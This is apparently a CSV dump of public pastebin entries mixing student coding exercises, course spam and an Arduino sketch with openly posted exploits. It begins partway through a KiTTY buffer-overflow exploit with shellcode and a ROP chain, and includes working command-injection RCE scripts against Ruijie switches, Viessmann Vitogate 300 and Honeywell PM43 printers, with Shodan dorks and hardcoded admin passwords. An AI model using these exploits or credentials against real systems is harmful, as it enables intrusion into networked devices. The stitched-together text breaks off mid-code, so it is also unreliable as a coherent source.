+buf += b""\xf7\xac\x52\x41\x1c\x59\x0b\x01\x9d\xc2\x88\xde""
+buf += b""\x21\x3f\x14\xa1\xa4\x7f\xb3\xc7\xd3\xab\x9e\xd4""
+buf += b""\xf2\x3b\x21""
+
+
+def shellcode():
+	sc = b''
+	sc += b'\xBB\x44\x24\x44\x44' # mov    ebx,0x44442444
+	sc += b'\xB8\x44\x44\x44\x44' # mov    eax,0x44444444
+	sc += b'\x29\xD8'             # sub    eax,ebx
+	sc += b'\x29\xC4'             # sub    esp,eax
+	sc += buf
+	sc += b'\x90' * (1052-len(sc))
+	assert len(sc) == 1052 
+	return sc
+
+
+def create_rop_chain():
+
+	# rop chain generated with mona.py - www.corelan.be
+	rop_gadgets = [
+	#[---INFO:gadgets_to_set_esi:---]
+	0x004c5832,  # POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe]
+	0x006424a4,  # ptr to &VirtualProtect() [IAT kitty.exe]
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x00484e07,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe]
+	0x00473cf6,  # XCHG EAX,ESI # RETN [kitty.exe]
+	#[---INFO:gadgets_to_set_ebp:---]
+	0x00429953,  # POP EBP # RETN [kitty.exe]
+	0x005405b0, # push esp; ret 0 [kitty.exe]
+	#[---INFO:gadgets_to_set_ebx:---]
+	0x0049d9f9,  # POP EBX # RETN [kitty.exe]
+	0x00000201,  # 0x00000201-> ebx
+	#[---INFO:gadgets_to_set_edx:---]
+	0x00430dce,  # POP EDX # RETN [kitty.exe]
+	0x00000040,  # 0x00000040-> edx
+	#[---INFO:gadgets_to_set_ecx:---]
+	0x005ac58c,  # POP ECX # RETN [kitty.exe]
+	0x004d81d9,  # &Writable location [kitty.exe]
+	#[---INFO:gadgets_to_set_edi:---]
+	0x004fa404,  # POP EDI # RETN [kitty.exe]
+	0x005a2001,  # RETN (ROP NOP) [kitty.exe]
+	#[---INFO:gadgets_to_set_eax:---]
+	0x004cd011,  # POP EAX # POP EBX # RETN [kitty.exe]
+	0x90909090,  # nop
+	0x41414141,  # Filler (compensate)
+	#[---INFO:pushad:---]
+	0x005dfbac,  # PUSHAD # RETN [kitty.exe]
+	]
+	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain()
+
+
+#----------------------------------------------------------------------------------#
+# Badchars: \x00\x07\x0a\x0d\x1b\x9c\x3A\x40                                       #
+# Return Address Information: 0x0052033c : {pivot 332 / 0x14c} :                   #
+#   ADD ESP,13C # POP EBX # POP ESI # POP EDI # POP EBP # RETN                     #
+#   ** [kitty.exe] **   |  startnull,ascii {PAGE_EXECUTE_READWRITE}                #
+# Shellcode size at ESP: 1052                                                      #
+#----------------------------------------------------------------------------------#
+
+return_address = struct.pack('<I',  0x0052033c) # ADD ESP,13C # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [kitty.exe] **   |  startnull,ascii {PAGE_EXECUTE_READWRITE}
+
+rop_chain_padding = b'\x90' * 35 
+nops = b'\x90' * 88
+
+escape_sequence = b'\033]0;__dt:' + shellcode() + return_address
+escape_sequence += rop_chain_padding + rop_chain
+escape_sequence += b'\x90'
+escape_sequence += b""\xE9\x2A\xFA\xFF\xFF"" #jmp $eip-1490
+escape_sequence += nops + b'\007'
+
+stdout = os.fdopen(sys.stdout.fileno(), 'wb') 
+stdout.write(escape_sequence)
+stdout.flush()
+            "
+YxaeWD65,Ruijie Switch PSG-5124 26293 - Remote Code Execution (RCE),FlyFar,Python,Thursday 14th of March 2024 09:03:46 AM CDT,"#- Exploit Title: Ruijie Switch PSG-5124 26293 - Remote Code Execution (RCE)
+#- Shodan Dork: http.html_hash:-1402735717
+#- Fofa Dork: body=""img/free_login_ge.gif"" && body=""./img/login_bg.gif""
+#- Exploit Author: ByteHunter
+#- Email: 0xByteHunter@proton.me
+#- Version: PSG-5124(LINK SOFTWARE RELEASE:26293)
+#- Tested on: PSG-5124(LINK SOFTWARE RELEASE:26293)
+
+import http.client
+import argparse
+
+def send_request(ip, port, command):
+    headers = {
+        ""Host"": f""{ip}:{port}"",
+        ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"",
+        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"",
+        ""Accept-Language"": ""en-US,en;q=0.5"",
+        ""Accept-Encoding"": ""gzip, deflate, br"",
+        ""DNT"": ""1"",
+        ""Connection"": ""close"",
+        ""Upgrade-Insecure-Requests"": ""1"",
+        ""Cmdnum"": ""1"",
+        ""Confirm1"": ""n"",
+        ""Content-Length"": ""0"",
+        ""Command1"": command
+    }
+
+    try:
+        connection = http.client.HTTPConnection(f""{ip}:{port}"")
+        connection.request(""GET"", ""/EXCU_SHELL"", headers=headers)
+        response = connection.getresponse()
+
+        
+        print(f""Status Code: {response.status}"")
+        print(response.read().decode('utf-8'))
+        connection.close()
+
+    except Exception as e:
+        print(f""Request failed: {e}"")
+
+if __name__ == ""__main__"":
+
+    parser = argparse.ArgumentParser(description='proof of concept for ruijie Switches RCE')
+    parser.add_argument('--ip', help='Target IP address', required=True)
+    parser.add_argument('--port', help='Port', required=True)
+    parser.add_argument('--cmd', help='Command', required=True)
+    args = parser.parse_args()
+
+
+    ip = args.ip
+    port = args.port
+    command = args.cmd
+
+
+    send_request(ip, port, command)
+            "
+cRbsEB9z,comp generates rand num betw 1 and 20 and you guess it,BojidarDosev,C++,Thursday 14th of March 2024 09:03:14 AM CDT,"#include <iostream>
+#include <cstdlib>
+
+using namespace std;
+
+int main()
+{
+	int num1, num2;
+
+	cout << ""your number is: "";
+	cin >> num2;
+
+	srand(time(NULL));
+	num1 = rand() % 20 + 1;
+
+	cout << ""computer number is: "" << num1 << endl;
+
+	if (num2 == num1)
+	{
+		cout << true;
+	}
+	else cout << false;
+}
+"
+TJdEKGqZ,Viessmann Vitogate 300 2.1.3.0 - Remote Code Execution (RCE) - CVE-2023-5702 & CVE-2023-5222,FlyFar,Python,Thursday 14th of March 2024 09:02:44 AM CDT,"#- Exploit Title: Viessmann Vitogate 300 <= 2.1.3.0 - Remote Code Execution (RCE)
+#- Shodan Dork: http.title:'Vitogate 300'
+#- Exploit Author: ByteHunter
+#- Email: 0xByteHunter@proton.me
+#- Version: versions up to 2.1.3.0
+#- Tested on: 2.1.1.0
+#- CVE : CVE-2023-5702 & CVE-2023-5222
+
+
+import argparse
+import requests
+
+def banner():
+    banner = """"""
+    ╔═══════════════════════════════════╗
+             CVE-2023-5702   
+           Vitogate 300 RCE
+           Author: ByteHunter      
+    ╚═══════════════════════════════════╝
+    """"""
+
+    print(banner)
+
+
+def send_post_request(target_ip, command, target_port):
+    payload = {
+        ""method"": ""put"",
+        ""form"": ""form-4-7"",
+        ""session"": """",
+        ""params"": {
+            ""ipaddr"": f""1;{command}""
+        }
+    }
+
+    headers = {
+        ""Host"": target_ip,
+        ""Content-Length"": str(len(str(payload))),
+        ""Content-Type"": ""application/json""
+    }
+
+    url = f""http://{target_ip}:{target_port}/cgi-bin/vitogate.cgi""
+
+
+    response = requests.post(url, json=payload, headers=headers)
+
+    if response.status_code == 200:
+        print(""Result:"")
+        print(response.text)
+    else:
+        print(f""Request failed! status code: {response.status_code}"")
+
+def main():
+    parser = argparse.ArgumentParser(description=""Vitogate 300 RCE & Hardcoded Credentials"")
+    parser.add_argument(""--target"", required=False, help=""Target IP address"")
+    parser.add_argument(""--port"", required=False, help=""Target port"",default=""80"")
+    parser.add_argument(""--command"", required=False, help=""Command"")
+    parser.add_argument(""--creds"", action=""store_true"", help=""Show hardcoded credentials"")
+
+    args = parser.parse_args()
+
+    if args.creds:
+        print(""Vitogate 300 hardcoded administrative accounts credentials"")
+        print(""Username: vitomaster, Password: viessmann1917"")
+        print(""Username: vitogate, Password: viessmann"")
+    else:
+        target_ip = args.target
+        target_port = args.port
+        command = args.command
+
+        if not (target_ip and command):
+            print(""Both --target and --command options are required.\nor use --creds option to see hardcoded Credentials."")
+            return
+
+        send_post_request(target_ip, command,target_port)
+
+if __name__ == ""__main__"":
+    banner()
+    main()
+            "
+V1Muadvu,Honeywell PM43 < P10.19.050004 - Remote Code Execution (RCE) - CVE-2023-3710,FlyFar,Python,Thursday 14th of March 2024 09:00:40 AM CDT,"#- Exploit Title: Honeywell PM43 < P10.19.050004 - Remote Code Execution (RCE)
+#- Shodan Dork: http.title:PM43 , PM43
+#- Exploit Author: ByteHunter
+#- Email: 0xByteHunter@proton.me
+#- Frimware Version: versions prior to P10.19.050004
+#- Tested on: P10.17.019667
+#- CVE : CVE-2023-3710
+
+
+import requests
+import argparse
+
+BLUE = '\033[94m'
+YELLOW = '\033[93m'
+RESET = '\033[0m'
+
+def banner():
+    banner = """"""
+    ╔════════════════════════════════════════════════╗
+        CVE-2023-3710   
+        Command Injection in Honeywell PM43 Printers
+        Author: ByteHunter      
+    ╚════════════════════════════════════════════════╝
+    """"""
+    print(YELLOW + banner + RESET)
+
+
+def run_command(url, command):
+    full_url = f""{url}/loadfile.lp?pageid=Configure""
+    payload = {
+        'username': f'hunt\n{command}\n',
+        'userpassword': 'admin12345admin!!'
+    }
+    try:
+        response = requests.post(full_url, data=payload, verify=False)
+        response_text = response.text
+        html_start_index = response_text.find('<html>')
+        if html_start_index != -1:
+            return response_text[:html_start_index]
+        else:
+            return response_text  
+    except requests.exceptions.RequestException as e:
+        return f""Error: {e}""
+
+def main():
+    parser = argparse.ArgumentParser(description='Command Injection PoC for Honeywell PM43 Printers')
+    parser.add_argument('--url', dest='url', help='Target URL', required=True)
+    parser.add_argument('--run', dest='command', help='Command to execute', required=True)
+
+    args = parser.parse_args()
+
+    response = run_command(args.url, args.command)
+    print(f""{BLUE}{response}{RESET}"")
+
+if __name__ == ""__main__"":
+    banner()
+    main()
+            "
+2azGUFci,Untitled,MeehoweCK,C++,Thursday 14th of March 2024 08:55:03 AM CDT,"#include <iostream>
+#include <conio.h>
+
+int main() {
+	double liczba, najwieksza;
+	std::cout << ""Podawaj liczby. 0 konczy wczytywanie: "";
+	std::cin >> liczba;
+	/*
+	while (liczba != 0) {
+		std::cin >> liczba;
+		if (liczba > najwieksza) najwieksza = liczba;
+	}*/
+
+	for (najwieksza = liczba; liczba != 0; std::cin >> liczba) {
+		if (liczba > najwieksza) {
+			najwieksza = liczba;
+		}
+	}
+
+	std::cout << ""Najwieksza wczytana liczba wynosi "" << najwieksza << std::endl;
+	_getch();
+	return 0;
+}"
+pGSHiQr2,sort 3 nums in asc and desc order,BojidarDosev,C++,Thursday 14th of March 2024 08:53:09 AM CDT,"#include <iostream>
+#include <vector>
+#include <algorithm>
+
+using namespace std;
+
+int main()
+{
+    vector <int> nums = { 5,2,3 };
+
+	sort(nums.begin(), nums.end());
+
+	for (int i = 0; i < 3; i++)
+	{
+		cout << nums[i] << "" "";
+	}
+
+	cout << endl;
+
+	sort(nums.begin(), nums.end(), greater<int>());
+
+	for (int i = 0; i < 3; i++)
+	{
+		cout << nums[i] << "" "";
+	}
+
+}
+"
+rBpaS4Jj,Untitled,MeehoweCK,C++,Thursday 14th of March 2024 08:49:48 AM CDT,"#include <iostream>
+#include <conio.h>
+
+int main() {
+	double liczba;
+	std::cout << ""Podawaj liczby. 0 konczy wczytywanie: "";
+	std::cin >> liczba;
+	auto najwieksza{ liczba };
+	while (liczba != 0) {
+		std::cin >> liczba;
+		if (liczba > najwieksza) najwieksza = liczba;
+	}
+	std::cout << ""Najwieksza wczytana liczba wynosi "" << najwieksza << std::endl;
+	_getch();
+	return 0;
+}"
+5xBycqNk,input_pcf_analog_isolate,mikroavr,Arduino,Thursday 14th of March 2024 08:32:30 AM CDT,"#include ""PCF8574.h""
+PCF8574 pcf8574(0x20);
+byte IN1 = P3;
+byte IN2 = P2;
+byte IN3 = P1;
+byte IN4 = P0;
+byte LED = 15;
+bool stateLed = 0;
+unsigned long cur_time, old_time;
+void setup() {
+  // put your setup code here, to run once:
+  delay(100);
+  Serial.begin(115200);
+  pinMode(LED, OUTPUT);
+  pcf8574.pinMode(IN1, INPUT);
+  pcf8574.pinMode(IN2, INPUT);
+  pcf8574.pinMode(IN3, INPUT);
+  pcf8574.pinMode(IN4, INPUT);
+  Serial.print(""Init pcf8574..."");
+  if (pcf8574.begin()) {
+    Serial.println(""OK"");
+  } else {
+    Serial.println(""KO"");
+  }
+  delay(100);
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+  cur_time = millis();
+  if(cur_time - old_time >= 3000){
+    stateLed = !stateLed;
+    digitalWrite(LED,stateLed);
+    Serial.print(pcf8574.digitalRead(IN1));
+    Serial.print(pcf8574.digitalRead(IN2));
+    Serial.print(pcf8574.digitalRead(IN3));
+    Serial.println(pcf8574.digitalRead(IN4));
+    old_time = millis();
+  }
+}"
+7JStC1i0,Untitled,sissou123,Python,Thursday 14th of March 2024 08:14:04 AM CDT,"The Complete Python Developer
+How to become a Python 3 Developer and get hired! Build 12+ projects, learn Web Development, Machine Learning + more! 
+What you'll learn
+Become a professional Python Developer and get hired
+Master modern Python 3.11(latest) fundamentals as well as advanced topics 
+for more:https://cuty.io/1OqCj1eA
+"
+YB9cWNEG,Untitled,sissou123,HTML,Thursday 14th of March 2024 08:10:59 AM CDT,"HTML5 and CSS3 Fundamentals
+Build your very own website with HTML5 from scratch using HTML5 and CSS3 - designed for complete beginners  
+What you'll learn
+Know how to use Html tags and build with the most common ones.
+Learn the use of attributes and common settings. 
+for more:https://cuty.io/HgAvZbwVk
+"
+qycCFNeU,Untitled,Roman9234,Python,Thursday 14th of March 2024 07:52:30 AM CDT,"import random
+import time
+
+
+class Character:
+    def __init__(self, name: str, xray_name: str, punch_names: list):
+        self.stamina = random.randint(50, 200)
+        self.max_stamina = self.stamina
+        self.name = name
+        self.xray_name = xray_name
+        self.punch_names = punch_names
+        self.mana = 0
+    
+    def bonus_hit(self, attacked_char):
+        self.damage = random.randint(5, 15)
+        if self.stamina > 100:
+            procent = (self.stamina - 100) / 100 # узнаем процент изменения жизней
+            bonus = - (self.damage - (self.damage * procent)) # убавляем от атаки столько же процентов
+        elif self.stamina < 100:
+            procent = (100 - self.stamina) / 100 # узнаем процент изменения жизней
+            bonus = self.damage + (self.damage * procent) # прибавляем к атаке столько же процентов
+        is_work = random.randint(1,3) # 1 - бонус сохраняется, 2 - бонус=урон врага, 3 - бонус теряется
+        if is_work == 2:
+            bonus = attacked_char.damage
+        elif is_work == 3:
+            bonus = 0
+        self.damage += bonus
+        self.damage = round(self.damage, 2)
+        print(f""Сработал бонус к атаке: + {procent}%! Текущий урон: {self.damage}"")
+        
+    def hit(self, attacked_char):
+        if self.superattack(attacked_char):
+            return None # если суператака, выйти из метода
+        self.mana += random.randint(1,10)
+        self.damage = random.randint(5, 15)
+        self.bonus_hit(attacked_char)
+        punch = random.choice(self.punch_names)  # название удара
+        attacked_char.stamina -= self.damage
+        print(f""{self.name} с помощью удара {punch} нанес {self.damage} единиц урона персонажу {attacked_char.name}"")
+
+    def superattack(self,attacked_char):
+        if self.mana > 40:
+            self.mana = 0 
+            self.damage = random.randint(15, 25)
+            attacked_char.stamina -= self.damage
+            print(f""{self.name} ИСПОЛЬЗОВАЛ СУПЕРУДАР {self.xray_name.upper()} нанес {self.damage} единиц урона персонажу {attacked_char.name}"")
+            return True
+        return False
+    
+    def say_info(self):
+        if self.stamina < 0:
+            self.stamina = 0
+        elif self.stamina > self.max_stamina:
+            self.stamina = self.max_stamina
+        self.stamina = round(self.stamina, 2)
+        # self.stamina = int(str(self.stamina)[:5])
+        print(f""{self.name}. Стамина = {self.stamina}. Мана = {self.mana}"")
+
+class Player(Character):
+    def heal(self):
+        bonus = random.randint(1, 20)
+        self.stamina += bonus
+        print(f""Здоровье восстановлено на {bonus} ед.!"")
+
+player = Player(""Роман"", ""Всемогущая атака"", [""ногой"", ""рукой""])
+
+char1 = Character('Скорпион', ""GET OVER HERE"", [
+                  ""Цепочный бам"", ""Огненный бум""])
+char2 = Character(""Охладулькин"", ""Сосульки-Удалюльки"",
+                  [""Ледяной бам"", ""Снежный бум""])
+char3 = Character(""Кунг-фу панда"", ""Пельменная атака"",
+                  [""Удар дракона"", ""Батутная поза""])
+char4 = Character(""Бэтмен"", ""Потому что он БЭТМЕН"", [
+                  ""Удар могучей рукой"", ""Бэтаранг"", ""Удар могучей ногой""])
+
+enemies = [char1, char2, char3, char4]
+# enemy1 = random.choice(enemies)
+# enemies.remove(enemy1)
+enemy2 = random.choice(enemies)
+print(f""{player.name} VS {enemy2.name}"")
+
+
+while True:
+    time.sleep(3)
+    action = input(""Выберите действие: 1 - исцелиться❤️, 2 - атаковать⚔️: "")
+    if action == ""1"":
+        player.heal()
+    else:
+        player.hit(enemy2)
+    enemy2.hit(player)
+    player.say_info()
+    enemy2.say_info()
+
+    if player.stamina <= 0 and enemy2.stamina <= 0:
+        print(""Ничья"")
+        break
+    elif player.stamina <= 0:
+        print(f""{enemy2.name} победил"")
+        break
+    elif enemy2.stamina <= 0:
+        print(f""{player.name} победил"")
+        break
+    print(""-"" * 50)
+    # ставки
+    # изменение урона или хп
+    # уворот, fatality
+
+    "
+7Dm0Qkbw,PlayerDatabase,UrayFenn,C#,Thursday 14th of March 2024 07:46:31 AM CDT,"namespace PlayerDatabase
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Database database = new Database();
+            database.ExecuteProgram();
+        }
+    }
+
+    class Player
+    {
+        private static int _counter;
+
+        public Player(string name, int level)
+        {
+            Name = name;
+            Level = level;
+            IsBanned = false;
+            IncreaseNumber();
+        }
+
+        public string Name { get; private set; }
+        public int Level { get; private set; }
+        public bool IsBanned { get; private set; }
+        public int Number { get; private set; }
+
+        public void Ban()
+        {
+            IsBanned = true;
+        }
+
+        public void Unban()
+        {
+            IsBanned = false;
+        }
+
+        public void ShowInfo()
+        {
+            string status;
+
+            if (IsBanned == true)
+            {
+                status = ""Забанен"";
+            }
+            else
+            {
+                status = ""Не забанен"";
+            }
+
+            Console.WriteLine($""Номер: {Number}|| Никнейм: {Name}|| Уровень: {Level}|| Статус: {status}"");
+        }
+
+        public void IncreaseNumber()
+        {
+            Number = ++_counter;
+        }
+    }
+
+    class Database
+    {
+        private List<Player> _players = new List<Player>();
+
+        public void ExecuteProgram()
+        {
+            const string CommandAddPlayer = ""1"";
+            const string CommandShowAllPlayers = ""2"";
+            const string CommandBanPlayer = ""3"";
+            const string CommandUnbanPlayer = ""4"";
+            const string CommandRemovePlayer = ""5"";
+            const string CommandShowBanPlayers = ""6"";
+            const string CommandExitProgramm = ""7"";
+
+            Database database = new Database();
+            bool isWork = true;
+
+            while (isWork)
+            {
+                Console.WriteLine($""\n{CommandAddPlayer} - Добавить игрока.\n"" +
+                    $""{CommandShowAllPlayers} - Список всех игроков.\n"" +
+                    $""{CommandBanPlayer} - Забанить игрока.\n"" +
+                    $""{CommandUnbanPlayer} - Разбанить игрока.\n"" +
+                    $""{CommandRemovePlayer} - Удалить игрока.\n"" +
+                    $""{CommandShowBanPlayers} - Показать всех забаненых игроков\n"" +
+                    $""{CommandExitProgramm} - Выход.\n"");
+                Console.Write(""Введите номер команды: "");
+                string userInput = Console.ReadLine();
+                Console.Clear();
+
+                switch (userInput)
+                {
+                    case CommandAddPlayer:
+                        database.AddPlayer();
+                        break;
+
+                    case CommandShowAllPlayers:
+                        database.ShowAllPlayers();
+                        break;
+
+                    case CommandBanPlayer:
+                        database.BanPlayer();
+                        break;
+
+                    case CommandUnbanPlayer:
+                        database.UnbanPlayer();
+                        break;
+
+                    case CommandRemovePlayer:
+                        database.RemovePlayer();
+                        break;
+
+                    case CommandShowBanPlayers:
+                        database.ShowBanPlayers();
+                        break;
+
+                    case CommandExitProgramm:
+                        isWork = false;
+                        break;
+
+                    default:
+                        Console.WriteLine(""Некорректный ввод попробуйте снова."");
+                        break;
+                }
+
+                Console.ReadKey();
+                Console.Clear();
+            }
+        }
+
+        private void AddPlayer()
+        {
+            Console.WriteLine(""Введите никнейм игрока:"");
+            string name = Console.ReadLine();
+            Console.WriteLine(""Введите уровень игрока:"");
+            int level = Convert.ToInt32(Console.ReadLine());
+            _players.Add(new Player(name, level));
+        }
+
+        private void RemovePlayer()
+        {
+            if (TryGetPlayer(out Player player))
+            {
+                _players.Remove(player);
+            }
+            else
+            {
+                Console.WriteLine(""Ошибка ввода, попробуйте снова."");
+            }
+        }
+
+        private void BanPlayer()
+        {
+            if (TryGetPlayer(out Player player))
+            {
+                player.Ban();
+            }
+            else
+            {
+                Console.WriteLine(""Ошибка ввода, попробуйте снова."");
+            }
+        }
+
+        private void UnbanPlayer()
+        {
+            if (TryGetPlayer(out Player player))
+            {
+                player.Unban();
+            }
+            else
+            {
+                Console.WriteLine(""Ошибка ввода, попробуйте снова."");
+            }
+        }
+
+        private void ShowAllPlayers()
+        {
+            if (_players.Count > 0)
+            {
+                foreach (Player player in _players)
+                {
+                    player.ShowInfo();
+                }
+            }
+            else
+            {
+                Console.WriteLine(""В базе данных пусто"");
+            }
+        }
+
+        private void ShowBanPlayers()
+        {
+            if (_players.Count > 0)
+            {
+                foreach (Player player in _players)
+                {
+                    if (player.IsBanned == true)
+                    {
+                        player.ShowInfo();
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine(""Нет забаненных игроков"");
+            }
+        }
+
+        private int ReadInt(string userInput)
+        {
+            int number = 0;
+            bool isWorking = true;
+
+            while (isWorking)
+            {
+                bool isNumber = int.TryParse(userInput, out number);
+
+                if (isNumber)
+                {
+                    isWorking = false;
+                }
+                else
+                {
+                    Console.WriteLine(""Попробуйте еще раз"");
+                    userInput = Console.ReadLine();
+                }
+            }
+
+            return number;
+        }
+
+        private bool TryGetPlayer(out Player player)
+        {
+            if (_players == null)
+            {
+                player = null;
+                Console.WriteLine(""Введите номер игрока:"");
+                int playerNumber = ReadInt(Console.ReadLine());
+
+                for (int i = 0; i < _players.Count; i++)
+                {
+                    if (playerNumber == _players[i].Number)
+                    {
+                        player = _players[i];
+                        return true;
+                    }
+                }
+
+                return false;
+            }
+            else
+            {
+                Console.WriteLine(""Список игроков пуст."");
+                player = null;
+                return false;
+            }
+        }
+    }
+}"
+sCmw3HhQ,Roblox FPS unlocker test for Mac,scriptingtales,PowerShell,Thursday 14th of March 2024 07:43:47 AM CDT,"#!/bin/sh
+
+targetFps=10000
+robloxPath=""/Applications/Roblox.app""
+
+if [ ! -d $robloxPath ]; then
+  $robloxPath=""~$robloxPath""
+
+  if [ ! -d $robloxPath ]; then
+    echo ""Roblox installation folder couldn't be found.""
+    exit
+  fi
+fi
+
+clientSettingsPath=""$robloxPath/Contents/MacOS/ClientSettings""
+
+if [ ! -d ""$clientSettingsPath"" ]; then
+  mkdir $clientSettingsPath
+fi
+
+echo ""Do you want to use the Vulkan renderer? This will remove the FPS cap completely, but might break Roblox if you use an external monitor. (yes/no): ""
+read useVulkan
+
+case $useVulkan in
+  yes)
+    clientSettings="" \
+    { \
+      \""DFIntTaskSchedulerTargetFps\"": $targetFps, \
+      \""FFlagDebugGraphicsDisableMetal\"": \""true\"", \
+      \""FFlagDebugGraphicsPreferVulkan\"": \""true\"" \
+    } \
+    ""
+    ;;
+
+  no)
+    clientSettings="" \
+    { \
+      \""DFIntTaskSchedulerTargetFps\"": $targetFps \
+    } \
+    ""
+    ;;
+
+  *)
+    echo ""Unknown option.""
+    exit 1
+    ;;
+esac
+
+echo $clientSettings > ""$clientSettingsPath/ClientAppSettings.json""
+echo ""The FPS unlocker has been installed in $robloxPath."""
+keyPz5pg,Pastebin Alternative,xxsa,PHP,Thursday 14th of March 2024 07:36:09 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free
+
+Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes
+
+150+ different syntax languages - All Free
+Paste Folders
+Load files feature
+Password protected pastes
+Encrypted pastes
+URL Shortener
+Unlisted pastes
+Private pastes
+Paste expiration system
+Self destroy pastes
+Embed, download, print pastes
+Socialite (Facebook/Twitter/Google Social login)
+Trending pastes page (day, week, month, year)
+Password protected pastes
+Encrypted pastes
+URL Shortener
+Unlisted pastes
+Private pastes
+Paste expiration system
+Self destroy pastes
+Share pastes on social network
+Embed, download, print pastes
+Facebook/Disqus/Custom comment system
+Trending pastes page (day, week, month, year)
+No Captcha for logged in users feature
+Simple Ads by Google Adsense Few rather than Pastebin"
+4pPCiLwG,Untitled,irmantas_radavicius,C++,Thursday 14th of March 2024 07:30:18 AM CDT,"#include <iostream>
+#include <stdexcept>
+
+#define MSG_POSITIVE ""Dimensions have to be positive""
+#define MSG_UNEXPECTED ""Unexpected error occurred""
+
+using namespace std;
+
+class Box {
+  private:	
+    int width;
+    int height;
+    int depth;
+  public:
+    // constructors
+    Box(int x, int y, int z){
+      setWidth(x);
+      setHeight(y);
+      setDepth(z);
+    }
+    // setters
+  public:
+    void setWidth(int width){
+      if(width > 0)
+        this->width = width;
+      else
+        throw invalid_argument(MSG_POSITIVE);
+    }
+    void setHeight(int height){
+      if(height > 0)
+        this->height = height;
+      else
+        throw invalid_argument(MSG_POSITIVE);
+    }
+    void setDepth(int depth){
+      if(depth > 0)
+        this->depth = depth;
+      else
+        throw invalid_argument(MSG_POSITIVE);
+    }
+    
+  public:
+    // getters
+    int getWidth(){
+      return this->width;
+    }
+    int getHeight(){
+      return this->height;
+    }
+    int getDepth(){
+      return this->depth;
+    }
+    string toString(){
+      string temp = ""("";
+      temp += to_string(getWidth());
+      temp += "", "" + to_string(getHeight());
+      temp += "", "" + to_string(getDepth());
+      temp += "")"";
+      return temp;
+    }
+};
+
+int main() {
+  try {
+    Box box(1, 2, 3);
+    cout << box.toString() << endl;
+    box.setWidth(10);
+    cout << box.toString() << endl;
+    box.setWidth(-10);
+    cout << box.toString() << endl;
+  
+  } catch(exception &e){
+    cout << e.what() << endl;
+  } catch(...){
+    cout << MSG_UNEXPECTED << endl;
+  }
+  
+  try {
+    Box box(10, -20, 30);
+    cout << box.toString() << endl;
+    box.setWidth(10);
+    cout << box.toString() << endl;
+    box.setWidth(-10);
+    cout << box.toString() << endl;
+  
+  } catch(exception &e){
+    cout << e.what() << endl;
+  } catch(...){
+    cout << MSG_UNEXPECTED << endl;
+  }
+  return 0;
+}
+"
+Ktk8TnbL,zsh default config,Guru01100101,Bash,Thursday 14th of March 2024 07:07:20 AM CDT,"# Use powerline
+USE_POWERLINE=""true""
+# Has weird character width
+# Example:
+#    is not a diamond
+HAS_WIDECHARS=""false""
+# Source manjaro-zsh-configuration
+if [[ -e /usr/share/zsh/manjaro-zsh-config ]]; then
+  source /usr/share/zsh/manjaro-zsh-config
+fi
+# Use manjaro zsh prompt
+if [[ -e /usr/share/zsh/manjaro-zsh-prompt ]]; then
+  source /usr/share/zsh/manjaro-zsh-prompt
+fi
+"
+0mTZHVJa,data868,TestGuy1,JSON,Thursday 14th of March 2024 07:00:06 AM CDT,"{
+  status: 'Success',
+  method: 'server',
+  maindata: '271ae2a8ab89554e3e89fd9b1dc0140aaa9179e79da9a9eb30955bb70c6b8ebb7f34410ff474899b7bb32af97156382de8cf91468ea41fcd21ba84a82fcde0bf8c7c7b19c15c46382cae717224b2e9638f7cf95675895bf6777f05bd8c56981a60b2c3ea9c200a271566e185c2b4af1c8c799d16f1c484dd74e57e7239361e71',
+  otherdata: [
+    '811171ab4430e6ee4cc91c577e037960',
+    'fc96181412e156464d72e80959feee88',
+    '141216723a5ae3be6a4e03833bda2942',
+    '44523d1203a8b8f93826cba3c57d3a59',
+    '349f68d62a2fd0e1c9516d91321d4044',
+    'cbb92b5106dba168688d8da06432c72a',
+    '97d014d6a4504931ac57ba6b1adb5d52',
+    'ed654a90aca0b041c9a7790d22c231cd'
+  ]
+}"
+K0p5HkGV,"03. Orders - Dictionaries, Lambda and LINQ - Exercise",Nikolay_Kashev,C#,Thursday 14th of March 2024 06:58:48 AM CDT,"using System;
+using System.Collections.Generic;
+
+public class Program {
+    public static void Main(string[] args) {
+        Dictionary<string, (double price, int quantity)> products = new Dictionary<string, (double price, int quantity)>();
+
+        string input = Console.ReadLine();
+        while (input != ""buy"") {
+            string[] tokens = input.Split(' ');
+            string name = tokens[0];
+            double price = double.Parse(tokens[1]);
+            int quantity = int.Parse(tokens[2]);
+
+            if (products.ContainsKey(name)) {
+                products[name] = (price, products[name].quantity + quantity);
+            }
+            else {
+                products[name] = (price, quantity);
+            }
+        }
+
+        foreach (var product in products) {
+            string name = product.Key;
+            double totalPrice = product.Value.price * product.Value.quantity;
+            //Console.WriteLine($""{name} -> {totalPrice:F2}"");
+			Console.WriteLine(""{0} -> {1:F2}"", name, totalPrice);
+        }		
+		// Console.WriteLine();		
+		// foreach (var product in products) {
+			// string name = product.Key;
+			// double price = product.Value.price;
+			// int quantity = product.Value.quantity;
+			// // Console.WriteLine($""{name} {price:F2} {quantity}"");
+			// Console.WriteLine(""{0} {1:F2} {2}"", name, price, quantity);
+		}
+    }
+}
+"
+gb4v4qEh,lol,Lil_Lil,C++,Thursday 14th of March 2024 06:51:43 AM CDT,"#include <iostream>
+#include <vector>
+#include <cmath>
+#include <algorithm>
+#include <limits>
+
+using namespace std;
+
+struct Point {
+    double x, y;
+};
+
+// Функция для вычисления расстояния между двумя точками
+double distance(const Point& p1, const Point& p2) {
